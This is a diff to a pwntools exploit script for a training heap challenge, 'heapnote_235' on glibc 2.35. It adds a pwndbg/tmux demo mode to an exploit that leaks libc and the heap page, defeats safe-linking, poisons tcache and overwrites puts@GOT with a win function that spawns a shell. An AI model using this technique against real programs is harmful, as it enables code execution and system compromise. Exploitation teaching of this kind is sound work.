@@ -68,12 +68,33 @@ NOTE: requires heapnote_235 built + patched against glibc-2.35 (make patch-235).
 """
 
 from pwn import *
+import sys
+
+# --demo: attach pwndbg in a tmux split pane. `break menu` stops the proc after
+# every command with a clean pwndbg prompt (no Ctrl-C needed). At each DEMO hint
+# run the named pwndbg command in the gdb pane, then `continue` there to advance.
+# Without --demo the script runs straight to a shell (default; pipe-friendly).
+DEMO = "--demo" in sys.argv
 
 context.binary = exe = ELF("./heapnote_235")
 libc = ELF("./glibc-2.35/libc-2.35.so")
 context.log_level = "info"
 
 p = process("./heapnote_235")
+
+# ---- live demo support (gdb/pwndbg + tmux) ----------------------------------
+# Run inside tmux:  python3 c4_safe_linking/exp.py --demo
+# pwndbg attaches in a right-hand pane with `break menu`: the proc stops after
+# every command, so you get a real pwndbg prompt to run `bins`/`tcache`/`got`.
+# Inspect at each DEMO hint, then `continue` in the gdb pane to advance.
+def demo_hint(msg: str):
+    if DEMO:
+        log.info("DEMO | %s", msg)
+
+if DEMO:
+    context.terminal = ["tmux", "splitw", "-h", "-p", "55"]
+    gdb.attach(p, gdbscript="break menu\ncontinue\n")
+    demo_hint("gdb attached (right pane). Proc stops after each command; inspect, then `continue` to advance.")
 
 # ---- menu helpers (same as C2/C3) -------------------------------------------
 def add(idx: int, size: int, data: bytes):
@@ -108,6 +129,7 @@ BIG = 0x418
 add(0, BIG, b"A" * 8)
 add(1, 0x18, b"GUARD")
 delete(0)
+demo_hint("run: bins | 0x420 chunk in the unsorted bin")
 leak = u64(show(0)[:8].ljust(8, b"\x00"))
 # On 2.34+ __malloc_hook is a compat NO-OP symbol, not main_arena-0x10, so the
 # C2/C3 trick (main_arena = __malloc_hook+0x10) does NOT work here. Instead we
@@ -130,6 +152,7 @@ delete(2)                    # only entry -> stored fd = &fd>>12 XOR 0
 prot_fd = u64(show(2)[:8].ljust(8, b"\x00"))
 heap_page = prot_fd          # because next was NULL
 log.success("heap page (>>12) = %#x", heap_page)
+demo_hint("run: vis_heap_chunks | freed note-2 stored fd == heap_page (printed above) -- the >>12 key")
 
 # PROTECT_PTR only uses &fd_slot >> 12 -- the heap PAGE -- and all our small
 # chunks sit on the same page, so the leaked heap_page is exactly the value
@@ -151,10 +174,12 @@ win_addr = exe.symbols["win"]
 forged = protect_ptr(heap_page << 12, target)   # = heap_page ^ puts@GOT
 edit(3, 8, p64(forged))
 log.info("poisoned chunk-3 fd -> puts@GOT (PROTECT_PTR'd = %#x)", forged)
+demo_hint("run: tcache | protected fd (PROTECT_PTR'd)")
 
 add(5, SZ, b"PADDING")               # malloc #1: returns chunk-3; head -> puts@GOT
 add(6, SZ, p64(win_addr))            # malloc #2: returns puts@GOT; write &win
 log.success("puts@GOT = &win (%#x)", win_addr)
+demo_hint("run: got | puts -> win")
 
 # No explicit trigger: after add(6) returns, the menu loop calls menu() ->
 # puts("=== heapnote ===") -> win() -> system("/bin/sh"). (puts is called
